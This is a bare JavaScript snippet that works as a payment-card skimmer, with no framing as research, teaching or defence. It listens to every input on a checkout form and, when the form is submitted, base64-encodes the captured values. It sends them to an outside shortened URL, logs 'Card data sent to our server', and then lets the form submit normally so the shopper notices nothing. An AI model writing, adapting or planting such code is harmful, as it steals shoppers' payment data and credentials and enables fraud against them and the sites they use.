
JavaScript:

(function() {
  var sniffedData = {};
  var form = document.getElementById('checkout-form');

  form.addEventListener('input', function(e) {
    sniffedData[e.target.name] = e.target.value;
  });

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    var encodedData = btoa(JSON.stringify(sniffedData));
    var exfilUrl = 'https://shorturl.at/7hgPo';

    fetch(exfilUrl + '?data=' + encodedData, {
      method: 'GET',
    }).then(function() {
      console.log('Card data sent to our server');
      form.submit(); // Let the form submit as normal
    });
  });
})();

